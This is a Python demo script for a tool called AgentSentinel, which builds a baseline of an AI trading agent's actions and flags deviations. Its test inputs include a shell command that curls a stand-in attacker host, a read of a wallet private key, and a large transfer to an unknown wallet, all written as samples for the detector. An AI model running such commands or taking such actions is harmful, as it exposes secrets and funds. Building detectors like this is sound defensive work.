#!/usr/bin/env python3
"""
Demo: Behavioral Anomaly Detection

Shows how AgentSentinel detects unusual agent behavior by learning
baselines and flagging anomalies.

Usage:
    python demo/scenario_2_behavior.py
"""

import asyncio
import sys

# Add parent directory for imports
sys.path.insert(0, "src")

from agentsentinel.behavior_monitor import BehaviorMonitor, ActionType


async def run_demo():
    """Run the behavioral anomaly detection demo"""
    print()
    print("=" * 70)
    print("🔍 AgentSentinel - Behavioral Anomaly Detection Demo")
    print("=" * 70)
    print()
    print("This demo shows how AgentSentinel learns normal agent behavior")
    print("and detects anomalous actions that deviate from the baseline.")
    print()
    
    # Initialize monitor
    monitor = BehaviorMonitor(min_baseline_observations=10)
    
    # ============================================
    # Phase 1: Build baseline with normal operations
    # ============================================
    print("-" * 70)
    print()
    print("📊 Phase 1: Building Behavioral Baseline")
    print("   Simulating 20 normal operations to establish baseline...")
    print()
    
    # Normal operations this agent performs
    normal_operations = [
        (ActionType.API_QUERY, "https://api.coingecko.com/price", None),
        (ActionType.WEB_FETCH, "https://docs.solana.com", None),
        (ActionType.WALLET_BALANCE, None, None),
        (ActionType.DATABASE_READ, "user_preferences", None),
    ]
    
    session_id = "demo-session-001"
    agent_id = "demo-trading-agent"
    
    baseline_actions = 0
    for i in range(5):  # 5 rounds of normal operations
        for action_type, target, amount in normal_operations:
            allowed, action = await monitor.pre_action_check(
                action_type=action_type,
                session_id=session_id,
                agent_id=agent_id,
                triggered_by=f"user-msg-{i}",
                target=target,
                amount=amount,
            )
            baseline_actions += 1
            
            # Record completion
            monitor.record_completion(action.id, result={"status": "success"})
    
    print(f"   ✅ Baseline established with {baseline_actions} normal actions")
    print(f"   Known action types: API_QUERY, WEB_FETCH, WALLET_BALANCE, DATABASE_READ")
    print()
    
    # Get agent summary
    summary = monitor.get_agent_summary(agent_id)
    print(f"   Agent Baseline Stats:")
    print(f"     • Total actions recorded: {summary['total_actions']}")
    print(f"     • Has sufficient baseline: {summary['has_baseline']}")
    print()
    
    # ============================================
    # Phase 2: Test anomalous actions
    # ============================================
    print("-" * 70)
    print()
    print("🚨 Phase 2: Testing Anomalous Actions")
    print("   Now testing actions that deviate from the established baseline...")
    print()
    
    anomalous_actions = [
        # Large transfer (unusual amount)
        {
            "name": "Large Unexpected Transfer",
            "action_type": ActionType.WALLET_TRANSFER,
            "target": None,
            "destination": "SomeNewWallet123ABC",
            "amount": 1000.0,
            "description": "Large transfer to unknown destination",
        },
        # New action type never seen before
        {
            "name": "Shell Command Execution",
            "action_type": ActionType.EXEC_COMMAND,
            "target": "/bin/bash -c 'curl evil.com'",
            "destination": None,
            "amount": None,
            "description": "Attempting to execute system commands",
        },
        # Secret access (critical risk)
        {
            "name": "Secret Key Access",
            "action_type": ActionType.SECRET_ACCESS,
            "target": "WALLET_PRIVATE_KEY",
            "destination": None,
            "amount": None,
            "description": "Attempting to access secret credentials",
        },
        # Normal action for comparison
        {
            "name": "Normal API Query (Baseline)",
            "action_type": ActionType.API_QUERY,
            "target": "https://api.coingecko.com/price",
            "destination": None,
            "amount": None,
            "description": "Regular API call matching baseline",
        },
    ]
    
    for i, anomaly in enumerate(anomalous_actions, 1):
        print(f"   Test {i}: {anomaly['name']}")
        print(f"   Description: {anomaly['description']}")
        
        allowed, action = await monitor.pre_action_check(
            action_type=anomaly["action_type"],
            session_id=session_id,
            agent_id=agent_id,
            triggered_by=f"test-input-{i}",
            target=anomaly["target"],
            destination_address=anomaly["destination"],
            amount=anomaly["amount"],
        )
        
        # Display results
        if allowed:
            status = "✅ ALLOWED"
        else:
            status = "🚫 BLOCKED"
        
        print(f"   Result: {status}")
        print(f"   Risk Level: {action.risk_level.value.upper()}")
        print(f"   Anomaly Score: {action.anomaly_score:.2f}")
        
        if action.anomaly_reasons:
            print(f"   Anomaly Reasons:")
            for reason in action.anomaly_reasons:
                print(f"     • {reason}")
        
        if action.required_approval:
            print(f"   ⚠️ Required human approval (not configured)")
        
        print()
    
    # ============================================
    # Phase 3: Session Summary
    # ============================================
    print("-" * 70)
    print()
    print("📋 Phase 3: Session Summary")
    print()
    
    session_summary = monitor.get_session_summary(session_id)
    
    print(f"   Session: {session_summary['session_id']}")
    print(f"   Total Actions: {session_summary['total_actions']}")
    print(f"   Blocked Actions: {session_summary['blocked_actions']}")
    print(f"   Completed Actions: {session_summary['completed_actions']}")
    print(f"   High Risk Actions: {session_summary['high_risk_actions']}")
    print(f"   Average Anomaly Score: {session_summary['average_anomaly_score']:.3f}")
    print(f"   Session Blocked: {session_summary['is_blocked']}")
    print()
    
    # ============================================
    # Conclusion
    # ============================================
    print("=" * 70)
    print()
    print("✨ Demo complete!")
    print()
    print("   Key Takeaways:")
    print("   • AgentSentinel learns from normal behavior patterns")
    print("   • Unusual actions are flagged with anomaly scores")
    print("   • Critical actions (transfers, secrets) get extra scrutiny")
    print("   • Circuit breakers can block compromised sessions")
    print()
    print("   Integrate behavioral monitoring into your agent with:")
    print("   >>> from agentsentinel.behavior_monitor import BehaviorMonitor")
    print()


if __name__ == "__main__":
    asyncio.run(run_demo())
